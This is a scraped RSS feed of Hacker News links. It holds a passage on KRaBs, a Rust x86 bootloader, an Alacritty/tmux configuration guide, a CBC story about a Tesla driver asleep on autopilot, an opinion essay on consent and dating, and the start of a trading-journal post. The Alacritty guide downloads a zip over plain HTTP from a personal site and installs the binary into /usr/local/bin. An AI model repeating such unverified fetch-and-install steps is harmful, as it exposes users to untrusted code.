<p><strong>Hardware initialization:</strong> </p><ul> <li>Setting the keyboard repeat rate.</li> <li>Disable interrupts and mask all interrupt levels.</li> <li>Setting Interrupt descriptor (IDT) and segment descriptor (GDT). As a result,</li> all selectors (CS, DS, ES, FS, GS) refer to the 4 Gbyte flat linear address space. <li>Change the address bus to 32 bits (Enable A20 line).</li> <li>Transition to protected mode.</li> <li>If the target is ELF64, set the 4G boot pagetable and transition to long mode.</li> </ul> 
<p><strong>Software initialization:</strong> </p><ul> <li>Get system memory by BIOS call.</li> </ul> 
<p><strong>Information transmission to the kernel:</strong> </p><ul> <li>KRaBs mount the FAT32 EFI System Partition and Reading the CONFIG.TXT.</li> <li>Setting <a target="_blank" rel="noopener noreferrer" href="https://www.kernel.org/doc/html/latest/x86/zero-page.html">Zero Page</a> of kernel parameters and transmit it to the OS.</li> </ul> 
<p><strong>Load items and Relocate the kernel:</strong> </p><ul> <li>Load kernel, initrd and command line according to CONFIG.TXT.</li> <li>The target is an ELF file, KRaBs do the ELF relocation.</li> </ul> 
<p>The format of CONFIG.TXT is a simple matrix-oriented text file that looks like this: </p>
<pre><code>
main.kernel sample-kernel
main.initrd sample-initrd
main.cmdlin sample command line clocksource=tsc net.ifnames=0
</code></pre>
<p>To perform the above process, KRaBs uses a program that is divided into four stages. </p>
</section>
<section>
<h3>Stages Overview</h3>
<ol> <li> stage1  </li> A 446 byte program written to the boot sector. The segment registers(CS, DS, ES, SS) are set to <code>0x07C0</code>, and the stack pointer (ESP) is initialized to <code>0xFFF0</code>. After that, stage2 is loaded to address <code>0x07C0:0x0200</code>, and jumps to address <code>0x07C0:0x0206</code>. In the latter half of stage1, there is an area for storing the sector position and length (in units of 512 bytes) of the stage2 program. <li> stage2  </li> Load stage3 and stage4, then jump to stage3. The stage3 program is loaded at address <code>0x07C0:0x6000</code>, the stage4 is loaded at address <code>0x0003_0000</code> in the extended memory area. The file is read from the disk using a 2K byte track buffer from address <code>0x07C0:0xEE00</code>, and further transferred to an appropriate address using <code>INT 15h</code> BIOS Function <code>0x87h</code>. A mechanism similar to this function is used in stage 4. When the loading of stage3 and stage4 is completed, jump to address <code>0x07C0:0x6000</code>.  <li> stage3  </li> Do hardware and software initialization which need BIOS calls. After a series of initialization, empty_zero_page information is prepared in <code>0x07C0:0x0000</code> to <code>0x07C0:0x0FFF</code>. Enable the A20 line, change the address bus to 32 bits, and shift to the protect mode. Then, jump to the Stage4. <li> stage4  </li> Mount the FAT32 EFI System Partition. Then, read and parse the CONFIG.TXT on that partition. Load ELF kernel image, initrd, and kernel command line according to CONFIG.TXT. Drop to real mode when executing I/O. Set Command line and image informations in empty_zero_page. ELF kernel image is stored to the extended memory address <code>0x100000</code> or later, and then the ELF32/ELF64 file is parsed and loaded. If the target is ELF64, set the 4G boot pagetable and transition to long mode. Finally, jump to the entry point to launch the kernel. At this time, put the physical address (<code>0x00007C00</code>) of the empty_zero_page information prepared in the low-order memory into the <code>ESI</code> or <code>RSI</code> register. <li> planktonü¶†  </li> library common to stage1 ~ stage4. </ol> 
</section>
<section>
<h3>How build KRaBs</h3>
<p>The directory structure of the KRaBs project is as follows: </p>
<pre><code>
$ cd /path/to
$ tree . -L 3
.
‚îú‚îÄ‚îÄ build.rs
‚îú‚îÄ‚îÄ Cargo.toml
‚îú‚îÄ‚îÄ rust-toolchain
‚îú‚îÄ‚îÄ src
‚îÇ   ‚îú‚îÄ‚îÄ bios
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ plankton
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ stage_1st
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ stage_2nd
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ stage_3rd
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ stage_4th
‚îÇ   ‚îú‚îÄ‚îÄ main.rs
‚îÇ   ‚îî‚îÄ‚îÄ uefi
...
</code></pre>
<p>All four stages that make up the bootloader for the legacy BIOS and a library called plankton are stored as a sub crate under a directory named <code>src/bios</code>.
<br>
 Under the <code>src/uefi</code> directory, we plan to store UEFI-compatible bootloader crates.
<br>
 All these sub-crates will be built by <code>build.rs</code> at <code>cargo build</code> time.
<br>
 </p>
<p><code>src/main.rs</code> is not the main body of the bootloader, <code>src/main.rs</code> is the CLI program that places KRaBs on the disk. This <code>main.rs</code> will write each stage of the KRaBs to the appropriate location on the disk. The <code>-w</code> option is used to write the stages to disk. </p>
<p>With this directory structure, just run <code>cargo buil</code> to build the CLI and the boot loader, and <code>cargo run -- -w disk.img</code> to burn the boot loader to disk. You can also test it with qemu by running <code>cargo run -- -e disk</code>. </p>
</section>
<section>
<h3>DISK Structure</h3>
<p>KRaBs supports disks that are partitioned in GPT format.
<br>
 The BIOS Boot Partition and the EFI System Partition are required. Place stage1 in the boot sector and stage2 ~ stage4 boot code for legacy BIOS in the BIOS Boot Partition. Place the CONFIG.TXT, Linux kernel, initrd on the FAT32 file system of the EFI System Partition. </p>
<p>Example: </p>
<pre><code>
$ gdisk -l disk.img 
...
Found valid GPT with protective MBR; using GPT.
Disk disk2.img: 204800 sectors, 100.0 MiB
Sector size (logical): 512 bytes
Disk identifier (GUID): 2A1F86BB-74EA-47C5-923A-7A3BAF83B5DF
Partition table holds up to 128 entries
Main partition table begins at sector 2 and ends at sector 33
First usable sector is 34, last usable sector is 204766
Partitions will be aligned on 2048-sector boundaries
Total free space is 2014 sectors (1007.0 KiB)

Number  Start (sector)    End (sector)  Size       Code  Name
   1            2048            4095   1024.0 KiB  EF02  BIOS boot partition
   2            4096          106495   50.0 MiB    EF00  EFI system partition
   3          106496          204766   48.0 MiB    8300  Linux filesystem
</code></pre>
</section>
<section>
<h3>Why use EFI System Partition?</h3>
<p>The reason for this is to make this project compatible with the UEFI environment in the future.
<br>
 I didn't support UEFI from the start because: </p>
<ul> <li>This bootloader was originally intended to be used on older PCs, such as the ThinkPad 600X.</li> <li>Currently, Legacy BIOS support works in a wider range system than UEFI.</li> <li>It is mainly intended to be used in the cloud environment except my PC. Legacy BIOS is the mainstream in x86 cloud environment, and there seems to be no merit to replace it with UEFI.</li> </ul> 
</section>
<section>
<h2>Is Rust good for writing a bootloader?</h2>
<p>I know there are pros and cons, but for me, Rust has been so much easier and better than writing C and assemblies. Personally, I think Rust is also pretty good for low-level programming, like bootloaders. </p>
<ol> <li> It's a great relief when the compilation is completed without problems   </li> When something goes wrong, most of the time I only need to suspect the unsafe part. This has made debugging a lot easier. I'm an amateur programmer, but thanks in part to this, I was able to complete my first prototype in a week. <li> Rust's build system is the best  </li> In Rust, you don't have to wonder which object file to link with which, like in C. <li> I can use my C experience</li> Since the chain loader is a rocket structure, we always have to code the unsafe parts in order to move to the next stage, and I thought it would be nice to be able to use the same techniques I often use in C for the unsafe parts.  <li> I think even the low-level code in no_std can be written in a modern way.</li> </ol> 
</section>
<section>
<h2>Issues</h2>
</section>
<section>
<h3>(RESOLVED) Setting Page Tables</h3>
<p>I tried to set up the page table with an alignment with a linker script or a struct attribute <a target="_blank" rel="noopener noreferrer" href="https://doc.rust-lang.org/reference/type-layout.html#representations">align</a>, but none of these things worked. It looked like the alignment settings were breaking other data structures. It's possible that I wasn't doing it right, but I didn't understand why and gave up debugging. In the end, I dealt with it by manually allocating the page table to the area where I wanted to set up. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/src/bios/stage_4th/src/svm/lm.rs#L44-L69">This code:</a> </p>
<pre><code>
fn setup_page_tables() {
    use plankton::layout::PGTABLE_START;
    use plankton::mem::MemoryRegion;
    let mut pg_table = ‚Ä¶</code></pre></section></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vmm.dev/en/rust/krabs.md">https://vmm.dev/en/rust/krabs.md</a></em></p>]]>
            </description>
            <link>https://vmm.dev/en/rust/krabs.md</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514100</guid>
            <pubDate>Fri, 18 Sep 2020 07:54:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Play console games on the web ‚Äì AirConsole]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514066">thread link</a>) | @morgam
<br/>
September 18, 2020 | http://aircn.sl/console | <a href="https://web.archive.org/web/*/http://aircn.sl/console">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://aircn.sl/console</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514066</guid>
            <pubDate>Fri, 18 Sep 2020 07:49:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alacritty ‚Äì Fastest OS X Terminal Emulator ‚Äì Terminal like tmux/alacritty config]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24513821">thread link</a>) | @bebrws
<br/>
September 18, 2020 | https://bradbarrows.com/post/alacritty | <a href="https://web.archive.org/web/*/https://bradbarrows.com/post/alacritty">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><article><img src="https://bradbarrows.com/static/alacritty.png" alt="Alacritty - Fastest OSX Terminal?"><div><h2>Introducing Alacritty</h2><p>Alacritty is most likely the fastest GPU accelerated terminal emulator for OSX.</p><p>The only reason I hadn't tried it or used it very much before was the learning curve 
of a new terminal emulator and it's lack of tabs.</p><p>Luckily I was able to figure out how to make a great tmux and alacritty configuration 
file along with some nice bash functions to help with editing the configurations.</p><h2>Setting up Alacritty using my build</h2><p>First <a href="https://github.com/bebrws/alacritty/releases/download/0.6.0-dev-brads/Alacritty.zip">install Alacritty</a> from my repo to get a build that has an "Always On Top' action
I built in. The keyboard combo for this will "Command Shift A".</p><h2>Setting up Alacritty using my tmux and alacritty config</h2><p>Next clone my <a href="https://github.com/bebrws/myalacritty">configuration files</a></p><pre><code>git clone git@github.com:bebrws/myalacritty.git
cd myalacritty
cp tmux.conf ~/.tmux.conf
mkdir -p ~/.config/alacritty/
cp * ~/.config/alacritty/
wget http://bradbarrows.com/dls/jsin.zip
unzip jsin.zip
mv jsin /usr/local/bin/jsin</code></pre><h2>Bash/ZSH functions</h2><p>Add these functions to your .zshrc</p><pre><code>######### ALACRITTY GOOODNESS ############
alias -g alacrittycolors='python3 /Users/bbarrows/Library/Python/3.8//lib/python/site-packages/alacritty_colorscheme/cli.py '
# To use run: alaFontSize 12
function alaFontSize() {
    cat ~/.config/alacritty/alacritty.yml | jsin --yaml --yamlout --whole "(l.font.size=Number(\"$1\")) &amp;&amp; l; " &gt; $HOME/.config/alacritty/alacritty.yml.tmp
    mv $HOME/.config/alacritty/alacritty.yml.tmp $HOME/.config/alacritty/alacritty.yml
}
# To use run: alaOpacity 0.8
function alaOpacity() {
    cat ~/.config/alacritty/alacritty.yml | jsin --yaml --yamlout --whole "(l.background_opacity=Number(\"$1\")) &amp;&amp; l; " &gt; $HOME/.config/alacritty/alacritty.yml.tmp
    mv $HOME/.config/alacritty/alacritty.yml.tmp $HOME/.config/alacritty/alacritty.yml
}
# To use run: alaColorTheme
# Must run: sudo pip3 install alacrittycolors
# before using
# Also make sure jsin is installed from above or: https://github.com/bebrws/jsin
function alaColorTheme() {
   export ALABASE=$(python3 -m site | grep site | grep packages | head -n 1 | jsin "l.replace(/\s*\'/g, '').replace(/,/g, '')")
   python3 $ALABASE/alacritty_colorscheme/cli.py -a ~/.config/alacritty/colors/$(ls  ~/.config/alacritty/colors/ | fzf --preview "python3 $ALABASE/alacritty_colorscheme/cli.py -a ~/.config/alacritty/colors/{} &amp;&amp; htop")
}
function alaResetDark()  {
  cp ~/.config/alacritty/alacritty.yml.dark ~/.config/alacritty/alacritty.yml
}
function alaResetLight()  {
  cp ~/.config/alacritty/alacritty.yml.light  ~/.config/alacritty/alacritty.yml
}</code></pre><h2>Keyboard shortcuts</h2><ul><li>You should end up with tabs that you can click on just like Terminal.app and then can use the keyboard shortcuts "Shift-Left or Right arrow key".</li><li>"Control-b then c" - Create a new tab</li><li>"Control-b then f" - Create a horizonal window in the tab</li><li>"Control-b then v" - Create a veritical window in the tab</li><li>"Alt-Left or Right arrow key" - Move between split windows in the tab</li><li>"Command-Shift-A" - Keep Alacritty always on top</li><li>"Command-Shift-F" - Full screen</li><li>"Command-Shift-=/-" - Font size</li></ul><p>All the control and alt backspace and arrow key bindings should work out of the box!</p><p>You will end up with this beautiful terminal:</p><p><img alt="Alacritty in action" src="https://bradbarrows.com/static/alacritty.gif"></p></div></article></div></div></section></div>]]>
            </description>
            <link>https://bradbarrows.com/post/alacritty</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513821</guid>
            <pubDate>Fri, 18 Sep 2020 07:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Speeding Tesla driver caught napping behind the wheel on Alberta highway]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513648">thread link</a>) | @goodcanadian
<br/>
September 17, 2020 | https://www.cbc.ca/news/canada/edmonton/tesla-driver-napping-alberta-speeding-1.5727828 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/edmonton/tesla-driver-napping-alberta-speeding-1.5727828">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A 20-year-old B.C. motorist who who found reclining behind the wheel of a Tesla while the electric vehicle was on autopilot has been charged by the RCMP in Alberta with speeding.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5727840.1600356254!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/tesla-speeding-alberta.JPG"></p></div><figcaption>The 20-year-old B.C. driver of this Tesla Model S has been charged with speeding and dangerous driving, a criminal offence. The incident occurred on July 9 on Highway 2 near Ponoka, about 100 kilometres south of Edmonton.<!-- --> <!-- -->(Alberta RCMP)</figcaption></figure><p><span><p>The RCMP&nbsp;in Alberta have charged a&nbsp;20-year-old British Columbia man with&nbsp;speeding while he was asleep at the wheel of a Tesla electric car.</p>  <p>The RCMP&nbsp;received&nbsp;a call at about&nbsp;4 p.m. on July 9 concerning&nbsp;a 2019 Tesla Model S speeding south on Highway 2 near Ponoka, about 100&nbsp;kilometres south of Edmonton.</p>  <p>Both front seats were fully&nbsp;reclined, and both the driver and passenger&nbsp;appeared to be sound asleep, police say.&nbsp;</p>  <p>The car appeared to be driving on&nbsp;autopilot at more than 140 km/h, RCMP&nbsp;Sgt. Darrin Turnbull&nbsp;told CBC News on Thursday. The speed limit on that stretch of highway is 110 km/h.</p>  <p>"Nobody was looking out the windshield to see where the car was going," he&nbsp;said.&nbsp;</p>  <p>"I've been in policing for over 23 years&nbsp;and the&nbsp;majority of that in traffic&nbsp;law enforcement, and I'm speechless.</p>  <p>"I've never, ever seen anything like this before, but of course the technology wasn't there."&nbsp;</p>  <p>Tesla Model S sedans have autopilot functions, including auto-steer and "traffic-aware" cruise control, and both functions appeared to be activated.</p>  <p>"We believe the vehicle&nbsp;was operating on the autopilot system, which is really just an advanced driver safety system, a driver assist program. You still need to be driving the vehicle," Turnbull said.&nbsp;</p>  <p>"But of course, there are after-market things that can be done to a vehicle against the manufacturer's recommendations to change or circumvent the safety system."&nbsp;</p>  <p>After the responding officer activated emergency lights on their vehicle, the Tesla automatically began to accelerate, Turnbull said, even as those vehicles that were ahead of the Tesla on the highway moved out of the way.</p>  <p>"Nobody appeared to be in the car, but the vehicle sped up because the line was clear in front."</p>  <ul>  </ul>  <p>The responding officer obtained radar readings on the vehicle, confirming that it had automatically accelerated to exactly 150 km/h.</p>  <p>The RCMP charged the driver with speeding and issued a 24-hour licence suspension for fatigue.&nbsp;</p>  <p>After further investigation and consultation with the Crown, a Criminal Code charge of dangerous driving was laid against the driver, police said.</p>  <p>The driver was served with a summons for court in December.</p>  <ul>   <li><strong><a href="https://www.cbc.ca/news/business/tesla-s-self-driving-autopilot-system-under-scrutiny-1.5413931" target="_blank">Tesla's self-driving Autopilot system under scrutiny after 3 deadly crashes</a></strong></li>   <li><strong><a href="https://www.cbc.ca/news/canada/british-columbia/driverless-tesla-richmond-b-c-1.5349855" target="_blank">Driverless Tesla coasting along mall parking lot raises questions, causes confusion</a></strong></li>  </ul>  <p>Autonomous cars are in their early stages in much of Canada, with Ontario and Quebec approving pilot projects as long as a vigilant driver is present to take control of the vehicle when needed.</p>  <p>There have not been any reported self-driving car crashes in Canada, but several have been reported in the United States, putting Tesla's autopilot driving system functions&nbsp;under scrutiny.</p>  <p>On Dec. 29, 2019, a Tesla Model S sedan left a freeway in Gardena, Calif., at high speed, ran a red light and struck a Honda Civic, killing two people inside, police said. On the same day, a Tesla Model 3 hit a parked firetruck on an Indiana freeway, killing a passenger in the Tesla.</p>  <p>On Dec. 7, a Model 3 struck a police cruiser on a Connecticut highway, but&nbsp;no one was hurt.</p>  <p>Tesla's autopilot function is designed to keep a car in its lane and at a safe distance from other vehicles. Autopilot also can change lanes on its own.</p>  <ul>  </ul>  <h2>'It&nbsp;gives all of us a bad name'</h2>  <p>Angie Dean, president of the Tesla Owners Club of Alberta, said the incident is troubling for the 300 paying members of her group&nbsp;and the more than 1,000 active members of the club's online Facebook group.&nbsp;</p>  <p>Dean said the driver-assist functions in Tesla vehicles are designed to enhance safety, not detract from it.</p>  <p>"This type of story is sort of next to&nbsp;a worst-case scenario," she&nbsp;said. "The only thing that would be worse than this is if someone had got hurt.&nbsp;Everyone that I've spoken with is just so disappointed and so frustrated because it's abuse of the system.</p>  <p>"It&nbsp;gives all of us a bad name, and the vast majority of us would never do something like this. We bought these cars because we want to be safer."</p>  <p>The driver-assist program&nbsp;requires&nbsp;regular input from the driver to function,&nbsp;Dean said. If the driver's hands come off the wheel, warnings begin going off every 15 seconds, she said.</p>  <p>"It asks you to put your hands on the wheel&nbsp;and&nbsp;turn it a little bit so that it knows that your hands are on the wheel," Dean said.&nbsp;</p>  <p>"If you don't, it starts beeping at you. And if you still don't, it gets even louder. And&nbsp;if you still don't, it actually turns the hazard lights on, slows the vehicle down and it pulls it over. It turns the car off and autopilot will not engage for the rest of that drive."</p>  <p><strong><em>WATCH | Is the technology behind driverless cars ready for the road?</em></strong></p>  <p><span><span><span></span><span>The technology behind self-driving cars is available and in use, but there are examples showing it may not be fully ready for the real world.<!-- --> <!-- -->2:09</span></span></span></p>  <p>Despite the built-in safeguards, videos&nbsp;circulating online instruct drivers on ways to "hack" and override&nbsp;these systems, Dean&nbsp;said.</p>  <p>"There are a lot of systems that are in place that are really, really trying not to make this possible. But if there's a will, there's a way, I suppose. "&nbsp;</p>  <p>Just because some vehicles can drive themselves, it doesn't mean they should, the RCMP said.&nbsp;</p>  <p>&nbsp;"Although manufacturers of new vehicles have built in safeguards to prevent drivers from taking advantage of the new safety systems in vehicles, those systems are just that ‚Äî supplemental safety systems," said Supt. Gary Graham of Alberta RCMP Traffic Services.&nbsp;</p>  <p>"They are not self-driving systems, they still come with the responsibility of driving."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/edmonton/tesla-driver-napping-alberta-speeding-1.5727828</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513648</guid>
            <pubDate>Fri, 18 Sep 2020 06:43:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Love Hurts: So let‚Äôs stop infantilizing women and demonizing men]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513528">thread link</a>) | @jseliger
<br/>
September 17, 2020 | https://www.persuasion.community/p/love-hurts-511 | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/love-hurts-511">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/d514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg&quot;,&quot;height&quot;:971,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1378800,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>If you've ever read a Regency romance novel or watched a Jane Austen adaptation, you probably have a passing acquaintance with the trope of the <em>ruined woman</em>: that tragic victim of some caddish man who loved her, left her, and wrecked her societal resale value on his way out the door. In a world governed by a patriarchal system of marriage and inheritance, dependent on female purity to ensure any male offspring were legitimate, the ruined woman was literally damaged goods. Even the slightest whiff of a premarital dalliance could spell her undoing.</p><p>These old school ideas about women's worth have never entirely left us, resurfacing over the years in everything from the work of Andrea Dworkin to the abstinence wars of the late 1990s (when sex ed teachers would memorably compare girls who had sex before marriage to used pieces of Scotch tape). With dowries out of the picture, the idea that sex devalued women attached itself instead to America's sudden obsession with self-esteem. A young woman who had sex, particularly casual sex, clearly didn't respect herself. She was trying to fill an emotional void with cheap physical connection, and‚Äîyes‚Äîwas making herself unmarriageable. <em>He won‚Äôt buy the cow,</em> we were told, <em>if he can get the milk for free.</em></p><p>Today, the notion that sexual contact is degrading to women has become wrapped up in the contemporary progressive language of trauma and consent. The damage in question is emotional, not material, but the paternalistic message is the same: innocent women must be protected. </p><p><em>Consent is sexy</em>, we are told, as sex-education pamphlets primly instruct us in the essentials of mid-coital conversation.<em> Do you like it when I touch you there? What do you want me to do to you? </em>Never mind that said literature studiously ignores the fact that for the young, inexperienced people at whom such instructions are directed, dirty talk by administrative mandate just adds a whole new layer of pressure to an already awkward situation: For all its protestations about how <em>hot </em>consent can be, the progressive discourse surrounding sex is markedly unsexy. Amid the obsession with power, oppression and the ever present threat of harm, the notion of desire (or, heaven forbid, <em>fun</em>) all but disappears. Even the most pornographic consent-is-sexy script is about risk mitigation, not titillation, an insurance waiver with a side of heavy breathing. </p><p>This laser-focus on consent effectively recasts sex itself as a dangerous act, to be undertaken with extreme caution and only if absolutely necessary. And if relationships are mainly about power and the threat of abuse, those who pursue them too enthusiastically must be viewed with suspicion. More old-school gender stereotypes crop up here: men are increasingly seen as predators almost by default, while women are cast as helpless, even infantile. (Witness the rise of the word "grooming," previously reserved for sexual predation of children, as something done to women in their twenties.) As a breathtaking range of disappointing male behavior gets swept under the umbrella of MeToo, the line between pursuing a woman and preying on her has become blurred. When it was revealed that comic book writer Warren Ellis <a href="https://www.theguardian.com/books/2020/jul/13/women-speak-out-about-warren-ellis-transmetropolitan">had relationships with multiple women at once</a>, the litany of harms included no sexual misconduct at all; instead, the women were "[shocked] at the sheer magnitude of his pursuits ‚Ä¶ heartbroken when he stopped talking to them, or angry after discovering he was sending many of them identical messages." </p><p>Shock, heartbreak, anger: these are normal things to feel when a romantic relationship goes sour. But today, they're lumped into the nefarious category of abuse by virtue of the purported power someone like Ellis‚Äîolder, wealthier, more professionally successful, or otherwise more <em>privileged</em>‚Äîholds over his partners. By contrast, the notion that these were known and unavoidable risks of intimacy is dismissed as victim-blaming. As one of Ellis' accusers tweeted, "None of us consented to being manipulated." </p><p>This notion of consent as a safeguard against upsetting emotions is both new and counterintuitive: in most contexts (for instance, medical trials or media interviews), consent is sought precisely because what follows cannot be predicted, and may well be uncomfortable. But in certain progressive spaces, discomfort of any kind is taken to indicate the absence of consent, rendering countless normal human interactions suspicious. Turning someone down isn't comfortable, but neither is asking someone out. Even happy relationships involve moments of discomfort, disappointment, conflict‚Äîand even amicable breakups are rarely pain-free. Yet young people are now being taught to expect absolute emotional safety in sex, love and courtship at all times‚Äîand that if they feel hurt, disappointed or betrayed, it means they've been violated.</p><p data-attrs="{&quot;url&quot;:&quot;https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;class&quot;:null}"><a href="https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share"><span>Share</span></a></p><div><p>So how did we get here? Social conservatives say that hookup culture is to blame, and they're not wrong: traditional courtship, monogamy and marriage have their downsides, but they do give relationships a certain amount of structure and security. In the age of Tinder, those safeguards are comparatively hard to come by‚Äîand the elaborate (and sometimes ridiculous) bureaucracy of consent regulations may be best understood as a desperate attempt to impose some order on this wild west of sex and intimacy, spearheaded by people who are terrified of being vulnerable or getting hurt. There's a sense that relationships could be made unfailingly safe and comfortable, that disappointment and awkwardness wouldn't exist, if we only had enough <em>rules</em>. </p><p> Relationships have always been risky endeavors, but, ironically, this hypervigilance has made them seem outright terrifying. Every new romance is treated like a scavenger hunt for "red flags" that forewarn abuse, and every breakup is subject to adjudication via the #MeToo framework. Unhappy exes hash out their grievances on social media in a way that used to be reserved for divorced celebrities wrangling for the sympathy of the press. Private affairs are dragged into the spotlight for public reckoning and reparations. Men, already saddled with the pressure of making the first move, have to calculate the additional risk that an awkward overture or misread signal will result not just in rejection, but public humiliation and ruination. For all its valuable contributions to combating sexual harassment in the workplace, #MeToo has also made dating itself at once more fraught and less appealing‚Äîfor everyone. If every relationship is a power struggle, in which the less privileged party is perpetually at risk of being victimized, why even bother? Who could possibly enjoy this? </p></div><p>This is not to demand a return to the rigid courtship norms of the Regency era‚Äînor to the blinkered sex-positivity of the early aughts. Instead, we need to reintroduce basic notions of female empowerment and individual agency, and push back against the facile understanding of complex interpersonal relationships as power struggles between oppressed and oppressor. We should teach both young men <em>and</em> young women to recognize each other's vulnerability and humanity‚Äîeven when a partner may hold more power than they do by certain measures‚Äîand to engage with their lovers as individuals, rather than as representatives of an identity group. And we should also teach young people to tolerate and work through discomfort, rather than seeing themselves as helplessly in thrall to power dynamics that leave them forever teetering on the precipice of victimhood. </p><p>When I wrote a teen advice column between 2009 and 2019, there was one question I received more often than any other: "How can I fall in love without getting hurt?" My answer was always the same: You can't! Intimacy requires vulnerability; the joy of human connection always comes with the risk of being hurt. But that risk is the same for everyone, no matter how privileged or blessed with institutional clout. Even the wealthiest, whitest, most cisheterosexual dudebro in the world can be absolutely wrecked by heartbreak‚Äîand even a person who sits at the intersectional nexus of multiple oppressed identity categories has the power to break someone's heart.</p><p>As much as trauma and abuse have replaced purity and marriageability on the landscape of moral panics, the same old fear is at work: that women's desires, left unchecked, will leave them in ruins. And while the impulse to protect young people from emotional pain may be well intentioned, the results are toxic. The obsessive focus on power as the driving mechanism in all relationships fuels a cycle of catastrophic thinking: women are ever more fearful of being mistreated, ever more convinced of their powerlessness to avoid it, and ever more sure that when it happens, they will be unable to handle it. And all the while, men, dehumanized by a framework that casts their desires as inherently predatory, are being taught to mistrust and infantilize women in the guise of respecting them.</p><p>We need to permanently banish the specter of the ruined woman from our understanding of heterosexual relationships. A healthy, sex-positive society acknowledges that unpredictability is a feature of dating, not a bug, and cannot be consent-scripted out of existence‚Äîparticularly for inexperienced people, and especially when it comes to casual sex. Young people must be taught to be kind with and conscientious to each other, to respect boundaries, and to err on the side of caution in ambiguous situations‚Äîbut they should also be taught that love and sex are rife with painful misunderstandings, and that even well-meaning people can hurt each other because they're insecure, confused or genuinely unsure about what they want. Instead of trying to keep them from ever feeling heartbreak, regret or shame, let's teach them that these things are always survivable, and sometimes even useful. Teach them to be gracious about rejection and charitable about missteps, knowing that they'll make mistakes ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.persuasion.community/p/love-hurts-511">https://www.persuasion.community/p/love-hurts-511</a></em></p>]]>
            </description>
            <link>https://www.persuasion.community/p/love-hurts-511</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513528</guid>
            <pubDate>Fri, 18 Sep 2020 06:23:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why you should keep a trading journal, even on a spreadsheet]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513482">thread link</a>) | @rjbernaldo
<br/>
September 17, 2020 | https://coinfu.io/blog/trading-journal/ | <a href="https://web.archive.org/web/*/https://coinfu.io/blog/trading-journal/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><img alt="Author: Rj" src="https://coinfu.io/static/home/photo1x1.jpeg"></p><p><span>Rj on August 22, 2020</span></p></div><p>Whether you follow the fundamentals or trade soley on technical analysis, keeping track of one‚Äôs trading activity is a necessary exercise that every investor must learn to do.</p><p><img alt="Space" src="https://coinfu.io/static/blog/pexels-jessica-lewis-583846.jpg"><span>Photo by Jessica Lewis from Pexels</span></p><p>This list of trades, more often referred to as a tracker or trading journal, provides you with quantifiable metrics to measure your strategy‚Äôs performance so you can tweak and adapt to whatever direction the market decides to move.</p><h2 id="how-do-i-start-a-trading-journal">How do I start a trading journal?</h2><p>There‚Äôs quite a few options available to us. Let‚Äôs go over some of the ways in which we can keep a trading journal;</p><h3 id="1-third-party-trading-journals">1. Third-party trading journals</h3><p>While this provides an automated way to log your trades, this method doesn‚Äôt really offer much in terms of freedom. Your data gets stored in their database and you need to learn how to use their platform as you will be spending a lot of time there.</p><h3 